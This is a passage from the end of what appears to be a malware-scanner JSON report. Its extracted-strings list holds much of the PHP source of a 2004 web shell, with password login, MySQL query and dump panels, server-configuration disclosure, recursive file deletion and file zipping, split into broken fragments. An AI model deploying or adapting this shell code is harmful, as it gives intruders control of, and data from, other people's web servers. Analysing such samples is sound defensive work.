            "\t$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','','','submit'));",
            "\t$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));",
            "\t$tb->makehidden('do','query');",
            "\t$tb->formfooter('1','30');",
            "}//end sql query",
            "elseif ($_GET['action'] == \"sqlbak\") {",
            "\t$action = '?action=sqlbak';",
            "\t$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';",
            "\t$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';",
            "\t$dbpassword = $_POST['dbpassword'];",
            "\t$dbname = $_POST['dbname'];",
            "\t$tb->tableheader();",
            "\t$tb->formheader($action,' MySQL \u077f');",
            "\t$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','','','submit'));",
            "\t@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);",
            "    $tables = @mysql_list_tables($dbname);",
            "    while ($table = @mysql_fetch_row($tables)) {",
            "\t\t$cachetables[$table[0]] = $table[0];",
            "    }",
            "    @mysql_free_result($tables);",
            "\tif (empty($cachetables)) {",
            "\t\t$tb->tdbody('<b>",
            "\u077f or \u01f0\u077f",
            "\u03ba\u0771</b>');",
            "\t} else {",
            "\t\t$tb->tdbody('<table border=\"0\" cellpadding=\"3\" cellspacing=\"1\"><tr><td valign=\"top\">\u0461:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type=\"radio\" name=\"backuptype\" value=\"server\" checked> ",
            ":</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan=\"2\"><input type=\"radio\" name=\"backuptype\" value=\"download\"> \u05b1\u0635 (\u02ba\u0421\u077f)</td></tr></table>');",
            "\t\t$tb->makehidden('do','backupmysql');",
            "\t\t$tb->formfooter('0','30');",
            "\t$tb->tablefooter();",
            "\t@mysql_close();",
            "}//end sql backup",
            "elseif ($_GET['action'] == \"phpenv\") {",
            "\t$upsize=get_cfg_var(\"file_uploads\") ? get_cfg_var(\"upload_max_filesize\") : \"\u03f4\";",
            "\t$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? \"<a href=\\\"mailto:\".$_SERVER['SERVER_ADMIN'].\"\\\">\".$_SERVER['SERVER_ADMIN'].\"</a>\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";",
            "\tif ($dis_func == \"\") {",
            "\t\t$dis_func = \"No\";",
            "\t}else {",
            "\t\t$dis_func = str_replace(\" \",\"<br>\",$dis_func);",
            "\t\t$dis_func = str_replace(\",\",\"<br>\",$dis_func);",
            "\t$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \"Yes\" : \"No\";",
            "\t\t$info = array(",
            "\t\t\t0  => array(\"\u02b1\",date(\"Ymd h:i:s\",time())),",
            "\t\t\t1  => array(\"\",\"<a href=\\\"http://\".$_SERVER['SERVER_NAME'].\"\\\" target=\\\"_blank\\\">\".$_SERVER['SERVER_NAME'].\"</a>\"),",
            "\t\t\t2  => array(\"IP\u05b7\",gethostbyname($_SERVER['SERVER_NAME'])),",
            "\t\t\t3  => array(\"\u03f5\u0373\",PHP_OS),",
            "\t\t\t5  => array(\"\u03f5\u0373\u05b1\",$_SERVER['HTTP_ACCEPT_LANGUAGE']),",
            "\t\t\t6  => array(\"\",$_SERVER['SERVER_SOFTWARE']),",
            "\t\t\t7  => array(\"Web\u02ff\",$_SERVER['SERVER_PORT']),",
            "\t\t\t8  => array(\"PHP\u0437\u02bd\",strtoupper(php_sapi_name())),",
            "\t\t\t9  => array(\"PHP\u6c7e\",PHP_VERSION),",
            "\t\t\t10 => array(\"\u06b0\u022b\u0123\u02bd\",getphpcfg(\"safemode\")),",
            "\t\t\t11 => array(\"\u0531\",$adminmail),",
            "\t\t\t12 => array(\"\u013c",
            "\",__FILE__),",
            "\t\t\t13 => array(\"\u02b9 URL \u013c allow_url_fopen\",getphpcfg(\"allow_url_fopen\")),",
            "\t\t\t14 => array(\"\u032c\u04ff enable_dl\",getphpcfg(\"enable_dl\")),",
            "\t\t\t15 => array(\"\u02be\u03e2 display_errors\",getphpcfg(\"display_errors\")),",
            "\t\t\t16 => array(\"\u0536\u022b\u05b1 register_globals\",getphpcfg(\"register_globals\")),",
            "\t\t\t17 => array(\"magic_quotes_gpc\",getphpcfg(\"magic_quotes_gpc\")),",
            "\t\t\t18 => array(\"\u02b9\u06b4 memory_limit\",getphpcfg(\"memory_limit\")),",
            "\t\t\t19 => array(\"POST\u05bd post_max_size\",getphpcfg(\"post_max_size\")),",
            "\t\t\t20 => array(\"\u03f4\u013c upload_max_filesize\",$upsize),",
            "\t\t\t21 => array(\"\uece4\u02b1 max_execution_time\",getphpcfg(\"max_execution_time\").\"\"),",
            "\t\t\t22 => array(\"",
            "\u013a disable_functions\",$dis_func),",
            "\t\t\t23 => array(\"phpinfo()\",$phpinfo),",
            "\t\t\t24 => array(\"\u013f\u01f0\u043f\u057cdiskfreespace\",intval(diskfreespace(\".\") / (1024 * 1024)).'Mb'),",
            "\t\t\t25 => array(\"\u037c\u03b4 GD Library\",getfun(\"imageline\")),",
            "\t\t\t26 => array(\"IMAP\u02bc\u03f5\u0373\",getfun(\"imap_close\")),",
            "\t\t\t27 => array(\"MySQL\u077f\",getfun(\"mysql_close\")),",
            "\t\t\t28 => array(\"SyBase\u077f\",getfun(\"sybase_close\")),",
            "\t\t\t29 => array(\"Oracle\u077f\",getfun(\"ora_close\")),",
            "\t\t\t30 => array(\"Oracle 8 \u077f\",getfun(\"OCILogOff\")),",
            "\t\t\t31 => array(\"PREL\ufde8 PCRE\",getfun(\"preg_match\")),",
            "\t\t\t32 => array(\"PDF\u0135\u05a7\",getfun(\"pdf_close\")),",
            "\t\t\t33 => array(\"Postgre SQL\u077f\",getfun(\"pg_close\")),",
            "\t\t\t34 => array(\"SNMP\u042d\",getfun(\"snmpget\")),",
            "\t\t\t35 => array(\"\u0479\u013c\u05a7(Zlib)\",getfun(\"gzclose\")),",
            "\t\t\t36 => array(\"XML\",getfun(\"xml_set_object\")),",
            "\t\t\t37 => array(\"FTP\",getfun(\"ftp_login\")),",
            "\t\t\t38 => array(\"ODBC\u077f\",getfun(\"odbc_close\")),",
            "\t\t\t39 => array(\"Session\u05a7\",getfun(\"session_start\")),",
            "\t\t\t40 => array(\"Socket\u05a7\",getfun(\"fsockopen\")),",
            "\t\t); ",
            "\t$tb->tableheader();",
            "\techo \"<form action=\\\"?action=phpenv\\\" method=\\\"POST\\\">\\n\";",
            "\t$tb->tdbody('<b>\u9ff4PHP",
            "\u05f4</b>','left','1','30','style=\"padding-left: 5px;\"');",
            "\t$tb->tdbody('",
            "(:magic_quotes_gpc): '.$tb->makeinput('phpvarname','','','text','40').' '.$tb->makeinput('','\u9ff4','','submit'),'left','2','30','style=\"padding-left: 5px;\"');",
            "\t$tb->makehidden('do','viewphpvar');",
            "\techo \"</form>\\n\";",
            "\t$hp = array(0=> '', 1=> 'PHP', 2=> '\u05a7\u05f4');",
            "\tfor ($a=0;$a<3;$a++) {",
            "\t\t$tb->tdbody('<b>'.$hp[1].'</b>','left','1','30','style=\"padding-left: 5px;\"');",
            "  <tr class=\"secondalt\">",
            "    <td>",
            "      <table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">",
            "<?php",
            "\t\tif ($a==0) {",
            "\t\t\tfor($i=0;$i<=12;$i++) {",
            "\t\t\t\techo \"<tr><td width=40% style=\\\"padding-left: 5px;\\\">\".$info[$i][0].\"</td><td>\".$info[$i][1].\"</td></tr>\\n\";",
            "\t\t\t}",
            "\t\t} elseif ($a == 1) {",
            "\t\t\tfor ($i=13;$i<=24;$i++) {",
            "\t\t\t\techo \"<tr><td width=40% style=\\\"padding-left: 5px;\\\">\".$info[$i][0].\"</td><td>\".$info[$i][1].\"</td></tr>\\n\";",
            "\t\t\t}",
            "\t\t} elseif ($a == 2) {",
            "\t\t\tfor ($i=25;$i<=40;$i++) {",
            "\t\t\t\techo \"<tr><td width=40% style=\\\"padding-left: 5px;\\\">\".$info[$i][0].\"</td><td>\".$info[$i][1].\"</td></tr>\\n\";",
            "\t\t\t}",
            "      </table>",
            "    </td>",
            "  </tr>",
            "<?php",
            "\t}//for",
            "echo \"</table>\";",
            "}//end phpenv",
            "<hr width=\"775\" noshade>",
            "<table width=\"775\" border=\"0\" cellpadding=\"0\">",
            "  <tr>",
            "    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>",
            "    <td align=\"right\"><?php",
            "\tdebuginfo();",
            "\tob_end_flush();\t",
            "\t?></td>",
            "  </tr>",
            "</table>",
            "</center>",
            "</body>",
            "</html>",
            "<?php",
            "/*======================================================",
            "======================================================*/",
            "\t// ",
            "\tfunction loginpage() {",
            "<style type=\"text/css\">",
            "input {font-family: \"Verdana\";font-size: \"11px\";BACKGROUND-COLOR: \"#FFFFFF\";height: \"18px\";border: \"1px solid #666666\";}",
            "</style>",
            "<form method=\"POST\" action=\"\">",
            "<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\">",
            "<input type=\"hidden\" name=\"do\" value=\"login\">",
            "<input type=\"submit\" value=\"Login\">",
            "</form>",
            "<?php",
            "\t\texit;",
            "\t}//end loginpage()",
            "\t// \u04b3\u03e2",
            "\tfunction debuginfo() {",
            "\t\tglobal $starttime;",
            "\t\t$mtime = explode(' ', microtime());",
            "\t\t$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);",
            "\t\techo \"Processed in $totaltime second(s)\";",
            "\t// \u0225\u05ea\u05b7",
            "\tfunction stripslashes_array(&$array) {",
            "\t\twhile(list($key,$var) = each($array)) {",
            "\t\t\tif ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == \"$key\")) {",
            "\t\t\t\tif (is_string($var)) {",
            "\t\t\t\t\t$array[$key] = stripslashes($var);",
            "\t\t\t\t}",
            "\t\t\t\tif (is_array($var))  {",
            "\t\t\t\t\t$array[$key] = stripslashes_array($var);",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\treturn $array;",
            "\t// \u027e\u013f",
            "\tfunction deltree($deldir) {",
            "\t\t$mydir=@dir($deldir);\t",
            "\t\twhile($file=$mydir->read())\t{ \t\t",
            "\t\t\tif((is_dir(\"$deldir/$file\")) AND ($file!=\".\") AND ($file!=\"..\")) { ",
            "\t\t\t\t@chmod(\"$deldir/$file\",0777);",
            "\t\t\t\tdeltree(\"$deldir/$file\"); ",
            "\t\t\t}",
            "\t\t\tif (is_file(\"$deldir/$file\")) {",
            "\t\t\t\t@chmod(\"$deldir/$file\",0777);",
            "\t\t\t\t@unlink(\"$deldir/$file\");",
            "\t\t\t}",
            "\t\t} ",
            "\t\t$mydir->close(); ",
            "\t\t@chmod(\"$deldir\",0777);",
            "\t\treturn (@rmdir($deldir)) ? 1 : 0;",
            "\t// \u0436\u03f6\u0434",
            "\tfunction dir_writeable($dir) {",
            "\t\tif (!is_dir($dir)) {",
            "\t\t\t@mkdir($dir, 0777);",
            "\t\tif(is_dir($dir)) {",
            "\t\t\tif ($fp = @fopen(\"$dir/test.txt\", 'w')) {",
            "\t\t\t\t@fclose($fp);",
            "\t\t\t\t@unlink(\"$dir/test.txt\");",
            "\t\t\t\t$writeable = 1;",
            "\t\t\t} else {",
            "\t\t\t\t$writeable = 0;",
            "\t\t\t}",
            "\t\treturn $writeable;",
            "\t// \u043c\u0131\u026b\u6efb",
            "\tfunction getrowbg() {",
            "\t\tglobal $bgcounter;",
            "\t\tif ($bgcounter++%2==0) {",
            "\t\t\treturn \"firstalt\";",
            "\t\t} else {",
            "\t\t\treturn \"secondalt\";",
            "\t// \u0221\u01f0\u013c\u03f5\u0373",
            "\tfunction getPath($mainpath, $relativepath) {",
            "\t\tglobal $dir;",
            "\t\t$mainpath_info           = explode('/', $mainpath);",
            "\t\t$relativepath_info       = explode('/', $relativepath);",
            "\t\t$relativepath_info_count = count($relativepath_info);",
            "\t\tfor ($i=0; $i<$relativepath_info_count; $i++) {",
            "\t\t\tif ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;",
            "\t\t\tif ($relativepath_info[$i] == '..') {",
            "\t\t\t\t$mainpath_info_count = count($mainpath_info);",
            "\t\t\t\tunset($mainpath_info[$mainpath_info_count-1]);",
            "\t\t\t\tcontinue;",
            "\t\t\t}",
            "\t\t\t$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];",
            "\t\t} //end for",
            "\t\treturn implode('/', $mainpath_info);",
            "\t// PHP",
            "\tfunction getphpcfg($varname) {",
            "\t\tswitch($result = get_cfg_var($varname)) {",
            "\t\t\tcase 0:",
            "\t\t\treturn \"No\";",
            "\t\t\tbreak;",
            "\t\t\tcase 1:",
            "\t\t\treturn \"Yes\";",
            "\t\t\tbreak;",
            "\t\t\tdefault:",
            "\t\t\treturn $result;",
            "\t\t\tbreak;",
            "\t// \u9eaf",
            "\tfunction getfun($funName) {",
            "\t\treturn (false !== function_exists($funName)) ? \"Yes\" : \"No\";",
            "\t// \u0479",
            "\tclass PHPZip{",
            "\tvar $out='';",
            "\t\tfunction PHPZip($dir)\t{",
            "    \t\tif (@function_exists('gzcompress'))\t{",
            "\t\t\t\t$curdir = getcwd();",
            "\t\t\t\tif (is_array($dir)) $filelist = $dir;",
            "\t\t        else{",
            "\t\t\t        $filelist=$this -> GetFileList($dir);//\u013c\u0431",
            "\t\t\t\t    foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);",
            "\t            }",
            "\t\t        if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);",
            "\t\t\t\telse chdir($curdir);",
            "\t\t\t\tif (count($filelist)>0){",
            "\t\t\t\t\tforeach($filelist as $filename){",
            "\t\t\t\t\t\tif (is_file($filename)){",
            "\t\t\t\t\t\t\t$fd = fopen ($filename, \"r\");",
            "\t\t\t\t\t\t\t$content = @fread ($fd, filesize ($filename));",
            "\t\t\t\t\t\t\tfclose ($fd);",
            "\t\t\t\t\t\t    if (is_array($dir)) $filename = basename($filename);",
            "\t\t\t\t\t\t\t$this -> addFile($content, $filename);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t}",
            "\t\t\t\t\t$this->out = $this -> file();",
            "\t\t\t\t\tchdir($curdir);",
            "\t\t\t\t}",
            "\t\t\t\treturn 1;",
            "\t\t\t}",
            "\t\t\telse return 0;",
            "\t\t// \u05b8\u013f",
            "\t\tfunction GetFileList($dir){",
            "\t\t\tstatic $a;",
            "\t\t\tif (is_dir($dir)) {",
            "\t\t\t\tif ($dh = opendir($dir)) {",
            "\t\t\t   \t\twhile (($file = readdir($dh)) !== false) {",
            "\t\t\t\t\t\tif($file!='.' && $file!='..'){",
            "            \t\t\t\t$f=$dir .'/'. $file;",
            "            \t\t\t\tif(is_dir($f)) $this->GetFileList($f);",
            "\t\t\t\t\t\t\t$a[]=$f;",
            "\t        \t\t\t}",
            "\t\t\t\t\t}",
            "     \t\t\t\tclosedir($dh);",
            "    \t\t\t}",
            "\t\t\t}",
            "\t\t\treturn $a;",
            "\t\tvar $datasec      = array();",
            "\t    var $ctrl_dir     = array();",
            "\t\tvar $eof_ctrl_dir = \"\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\";",
            "\t    var $old_offset   = 0;",
            "\t\tfunction unix2DosTime($unixtime = 0) {",
            "\t        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);",
            "\t\t    if ($timearray['year'] < 1980) {",
            "\t\t\t\t$timearray['year']    = 1980;",
            "        \t\t$timearray['mon']     = 1;",
            "\t        \t$timearray['mday']    = 1;",
            "\t\t    \t$timearray['hours']   = 0;",
            "\t\t\t\t$timearray['minutes'] = 0;",
            "        \t\t$timearray['seconds'] = 0;",
            "\t        } // end if",
            "\t\t    return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |",
            "\t\t\t        ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);",
            "\t    }",
            "\t\tfunction addFile($data, $name, $time = 0) {",
            "\t        $name     = str_replace('\\\\', '/', $name);",
            "\t\t    $dtime    = dechex($this->unix2DosTime($time));",
            "\t        $hexdtime = '\\x' . $dtime[6] . $dtime[7]",
            "\t\t              . '\\x' . $dtime[4] . $dtime[5]",
            "\t\t\t          . '\\x' . $dtime[2] . $dtime[3]",
            "\t\t\t\t      . '\\x' . $dtime[0] . $dtime[1];",
            "\t        eval('$hexdtime = \"' . $hexdtime . '\";');",
            "\t\t    $fr   = \"\\x50\\x4b\\x03\\x04\";",
            "\t\t\t$fr   .= \"\\x14\\x00\";",
            "\t        $fr   .= \"\\x00\\x00\";",
            "\t\t    $fr   .= \"\\x08\\x00\";",
            "\t\t\t$fr   .= $hexdtime;",
            "\t        $unc_len = strlen($data);",
            "\t\t    $crc     = crc32($data);",
            "\t\t\t$zdata   = gzcompress($data);",
            "\t        $c_len   = strlen($zdata);",
            "\t\t    $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);",
            "\t\t\t$fr      .= pack('V', $crc);",
            "\t        $fr      .= pack('V', $c_len);",
            "\t\t    $fr      .= pack('V', $unc_len);",
            "\t\t\t$fr      .= pack('v', strlen($name));",
            "\t        $fr      .= pack('v', 0);",
            "\t\t    $fr      .= $name;",
            "\t\t\t$fr .= $zdata;",
            "\t        $fr .= pack('V', $crc);",
            "\t\t    $fr .= pack('V', $c_len);",
            "\t\t\t$fr .= pack('V', $unc_len);",
            "\t        $this -> datasec[] = $fr;",
            "\t\t    $new_offset        = strlen(implode('', $this->datasec));",
            "\t\t\t$cdrec = \"\\x50\\x4b\\x01\\x02\";",
            "\t        $cdrec .= \"\\x00\\x00\";",
            "\t\t    $cdrec .= \"\\x14\\x00\";",
            "\t\t\t$cdrec .= \"\\x00\\x00\";",
            "\t        $cdrec .= \"\\x08\\x00\";",
            "\t\t    $cdrec .= $hexdtime;",
            "\t\t\t$cdrec .= pack('V', $crc);",
            "\t        $cdrec .= pack('V', $c_len);",
            "\t\t    $cdrec .= pack('V', $unc_len);",
            "\t\t\t$cdrec .= pack('v', strlen($name) );",
            "\t        $cdrec .= pack('v', 0 );",
            "\t\t    $cdrec .= pack('v', 0 );",
            "\t\t\t$cdrec .= pack('v', 0 );",
            "\t        $cdrec .= pack('v', 0 );",
            "\t\t    $cdrec .= pack('V', 32 );",
            "\t\t\t$cdrec .= pack('V', $this -> old_offset );",
            "\t        $this -> old_offset = $new_offset;",
            "\t\t    $cdrec .= $name;",
            "\t\t\t$this -> ctrl_dir[] = $cdrec;",
            "\t    }",
            "\t\tfunction file() {",
            "\t\t\t$data    = implode('', $this -> datasec);",
            "\t        $ctrldir = implode('', $this -> ctrl_dir);",
            "\t\t    return",
            "\t\t\t    $data .",
            "\t\t\t\t$ctrldir .",
            "\t            $this -> eof_ctrl_dir .",
            "\t\t        pack('v', sizeof($this -> ctrl_dir)) .",
            "\t\t\t    pack('v', sizeof($this -> ctrl_dir)) .",
            "\t\t\t\tpack('V', strlen($ctrldir)) .",
            "\t            pack('V', strlen($data)) .",
            "\t\t        \"\\x00\\x00\";",
            "\t    }",
            "\t// \u077f",
            "\tfunction sqldumptable($table, $fp=0) {",
            "\t\t$tabledump = \"DROP TABLE IF EXISTS $table;\\n\";",
            "\t\t$tabledump .= \"CREATE TABLE $table (\\n\";",
            "\t\t$firstfield=1;",
            "\t\t$fields = mysql_query(\"SHOW FIELDS FROM $table\");",
            "\t\twhile ($field = mysql_fetch_array($fields)) {",
            "\t\t\tif (!$firstfield) {",
            "\t\t\t\t$tabledump .= \",\\n\";",
            "\t\t\t} else {",
            "\t\t\t\t$firstfield=0;",
            "\t\t\t}",
            "\t\t\t$tabledump .= \"   $field[Field] $field[Type]\";",
            "\t\t\tif (!empty($field[\"Default\"])) {",
            "\t\t\t\t$tabledump .= \" DEFAULT '$field[Default]'\";",
            "\t\t\t}",
            "\t\t\tif ($field['Null'] != \"YES\") {",
            "\t\t\t\t$tabledump .= \" NOT NULL\";",
            "\t\t\t}",
            "\t\t\tif ($field['Extra'] != \"\") {",
            "\t\t\t\t$tabledump .= \" $field[Extra]\";",
            "\t\t\t}",
            "\t\tmysql_free_result($fields);",
            "\t\t$keys = mysql_query(\"SHOW KEYS FROM $table\");",
            "\t\twhile ($key = mysql_fetch_array($keys)) {",
            "\t\t\t$kname=$key['Key_name'];",
            "\t\t\tif ($kname != \"PRIMARY\" and $key['Non_unique'] == 0) {",
            "\t\t\t\t$kname=\"UNIQUE|$kname\";",
            "\t\t\t}",
            "\t\t\tif(!is_array($index[$kname])) {",
            "\t\t\t\t$index[$kname] = array();",
            "\t\t\t}",
            "\t\t\t$index[$kname][] = $key['Column_name'];",
            "\t\tmysql_free_result($keys);",
            "\t\twhile(list($kname, $columns) = @each($index)) {",
            "\t\t\t$tabledump .= \",\\n\";",
            "\t\t\t$colnames=implode($columns,\",\");",
            "\t\t\tif ($kname == \"PRIMARY\") {",
            "\t\t\t\t$tabledump .= \"   PRIMARY KEY ($colnames)\";",
            "\t\t\t} else {",
            "\t\t\t\tif (substr($kname,0,6) == \"UNIQUE\") {",
            "\t\t\t\t\t$kname=substr($kname,7);",
            "\t\t\t\t}",
            "\t\t\t\t$tabledump .= \"   KEY $kname ($colnames)\";",
            "\t\t\t}",
            "\t\t$tabledump .= \"\\n);\\n\\n\";",
            "\t\tif ($fp) {",
            "\t\t\tfwrite($fp,$tabledump);",
            "\t\t} else {",
            "\t\t\techo $tabledump;",
            "\t\t$rows = mysql_query(\"SELECT * FROM $table\");",
            "\t\t$numfields = mysql_num_fields($rows);",
            "\t\twhile ($row = mysql_fetch_array($rows)) {",
            "\t\t\t$tabledump = \"INSERT INTO $table VALUES(\";",
            "\t\t\t$fieldcounter=-1;",
            "\t\t\t$firstfield=1;",
            "\t\t\twhile (++$fieldcounter<$numfields) {",
            "\t\t\t\tif (!$firstfield) {",
            "\t\t\t\t\t$tabledump.=\", \";",
            "\t\t\t\t} else {",
            "\t\t\t\t\t$firstfield=0;",
            "\t\t\t\t}",
            "\t\t\t\tif (!isset($row[$fieldcounter])) {",
            "\t\t\t\t\t$tabledump .= \"NULL\";",
            "\t\t\t\t} else {",
            "\t\t\t\t\t$tabledump .= \"'\".mysql_escape_string($row[$fieldcounter]).\"'\";",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\t$tabledump .= \");\\n\";",
            "\t\t\tif ($fp) {",
            "\t\t\t\tfwrite($fp,$tabledump);",
            "\t\t\t} else {",
            "\t\t\t\techo $tabledump;",
            "\t\t\t}",
            "\t\tmysql_free_result($rows);",
            "\tclass FORMS {",
            "\t\tfunction tableheader() {",
            "\t\t\techo \"<table width=\\\"775\\\" border=\\\"0\\\" cellpadding=\\\"3\\\" cellspacing=\\\"1\\\" bgcolor=\\\"#ffffff\\\">\\n\";",
            "\t\tfunction headerform($arg=array()) {",
            "\t\t\tglobal $dir;",
            "\t\t\tif ($arg[enctype]){",
            "\t\t\t\t$enctype=\"enctype=\\\"$arg[enctype]\\\"\";",
            "\t\t\t} else {",
            "\t\t\t\t$enctype=\"\";",
            "\t\t\t}",
            "\t\t\tif (!isset($arg[method])) {",
            "\t\t\t\t$arg[method] = \"POST\";",
            "\t\t\t}",
            "\t\t\tif (!isset($arg[action])) {",
            "\t\t\t\t$arg[action] = '';",
            "\t\t\t}",
            "\t\t\techo \"  <form action=\\\"\".$arg[action].\"\\\" method=\\\"\".$arg[method].\"\\\" $enctype>\\n\";",
            "\t\t\techo \"  <tr>\\n\";",
            "\t\t\techo \"    <td>\".$arg[content].\"</td>\\n\";",
            "\t\t\techo \"  </tr>\\n\";",
            "\t\t\techo \"  </form>\\n\";",
            "\t\tfunction tdheader($title) {",
            "\t\t\tglobal $dir;",
            "\t\t\techo \"  <tr class=\\\"firstalt\\\">\\n\";",
            "\t\t\techo \"\t<td align=\\\"center\\\"><b>\".$title.\" [<a href=\\\"?dir=\".urlencode($dir).\"\\\"></a>]</b></td>\\n\";",
            "\t\t\techo \"  </tr>\\n\";",
            "\t\tfunction tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {",
            "\t\t\tif ($bgcolor=='2') {",
            "\t\t\t\t$css=\"secondalt\";",
            "\t\t\t} elseif ($bgcolor=='1') {",
            "\t\t\t\t$css=\"firstalt\";",
            "\t\t\t} else {",
            "\t\t\t\t$css=$bgcolor;",
            "\t\t\t}",
            "\t\t\t$height = empty($height) ? \"\" : \" height=\".$height;",
            "\t\t\t$colspan = empty($colspan) ? \"\" : \" colspan=\".$colspan;",
            "\t\t\techo \"  <tr class=\\\"\".$css.\"\\\">\\n\";",
            "\t\t\techo \"\t<td align=\\\"\".$align.\"\\\"\".$height.\" \".$colspan.\" \".$extra.\">\".$content.\"</td>\\n\";",
            "\t\t\techo \"  </tr>\\n\";",
            "\t\tfunction tablefooter() {",
            "\t\t\techo \"</table>\\n\";",
            "\t\tfunction formheader($action='',$title,$target='') {",
            "\t\t\tglobal $dir;",
            "\t\t\t$target = empty($target) ? \"\" : \" target=\\\"\".$target.\"\\\"\";",
            "\t\t\techo \" <form action=\\\"$action\\\" method=\\\"POST\\\"\".$target.\">\\n\";",
            "\t\t\techo \"  <tr class=\\\"firstalt\\\">\\n\";",
            "\t\t\techo \"\t<td align=\\\"center\\\"><b>\".$title.\" [<a href=\\\"?dir=\".urlencode($dir).\"\\\"></a>]</b></td>\\n\";",
            "\t\t\techo \"  </tr>\\n\";",
            "\t\tfunction makehidden($name,$value=''){",
            "\t\t\techo \"<input type=\\\"hidden\\\" name=\\\"$name\\\" value=\\\"$value\\\">\\n\";",
            "\t\tfunction makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){",
            "\t\t\t$css = ($css == 'input') ? \" class=\\\"input\\\"\" : \"\";",
            "\t\t\t$input = \"<input name=\\\"$name\\\" value=\\\"$value\\\" type=\\\"$type\\\" \".$css.\" size=\\\"$size\\\" $extra>\\n\";",
            "\t\t\treturn $input;",
            "\t\tfunction maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){",
            "\t\t\t$textarea = \"<textarea name=\\\"\".$name.\"\\\" cols=\\\"\".$cols.\"\\\" rows=\\\"\".$rows.\"\\\" \".$extra.\">\".$content.\"</textarea>\\n\";",
            "\t\t\treturn $textarea;",
            "\t\tfunction formfooter($over='',$height=''){",
            "\t\t\t$height = empty($height) ? \"\" : \" height=\\\"\".$height.\"\\\"\";",
            "\t\t\techo \"  <tr class=\\\"secondalt\\\">\\n\";",
            "\t\t\techo \"\t<td align=\\\"center\\\"\".$height.\"><input class=\\\"input\\\" type=\\\"submit\\\" value=\\\"\u0237\\\"></td>\\n\";",
            "\t\t\techo \"  </tr>\\n\";",
            "\t\t\techo \" </form>\\n\";",
            "\t\t\techo $end = empty($over) ? \"\" : \"</table>\\n\";",
            "\t\tfunction makeselect($arg = array()){",
            "\t\t\tif ($arg[multiple]==1) {",
            "\t\t\t\t$multiple = \" multiple\";",
            "\t\t\t\tif ($arg[size]>0) {",
            "\t\t\t\t\t$size = \"size=$arg[size]\";",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\tif ($arg[css]==0) {",
            "\t\t\t\t$css = \"class=\\\"input\\\"\";",
            "\t\t\t}",
            "\t\t\t$select = \"<select $css name=\\\"$arg[name]\\\"$multiple $size>\\n\";",
            "\t\t\t\tif (is_array($arg[option])) {",
            "\t\t\t\t\tforeach ($arg[option] AS $key=>$value) {",
            "\t\t\t\t\t\tif (!is_array($arg[selected])) {",
            "\t\t\t\t\t\t\tif ($arg[selected]==$key) {",
            "\t\t\t\t\t\t\t\t$select .= \"<option value=\\\"$key\\\" selected>$value</option>\\n\";",
            "\t\t\t\t\t\t\t} else {",
            "\t\t\t\t\t\t\t\t$select .= \"<option value=\\\"$key\\\">$value</option>\\n\";",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t} elseif (is_array($arg[selected])) {",
            "\t\t\t\t\t\t\tif ($arg[selected][$key]==1) {",
            "\t\t\t\t\t\t\t\t$select .= \"<option value=\\\"$key\\\" selected>$value</option>\\n\";",
            "\t\t\t\t\t\t\t} else {",
            "\t\t\t\t\t\t\t\t$select .= \"<option value=\\\"$key\\\">$value</option>\\n\";",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t$select .= \"</select>\\n\";",
            "\t\t\treturn $select;"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.4ngel.net",
            "http://www.bugkidz.org\\",
            "http://www.bugkidz.org",
            "http://www.4ngel.net\\",
            "http://www.molyx.com",
            "http://"
        ]
    },
    "time": "0:00:00.580997",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
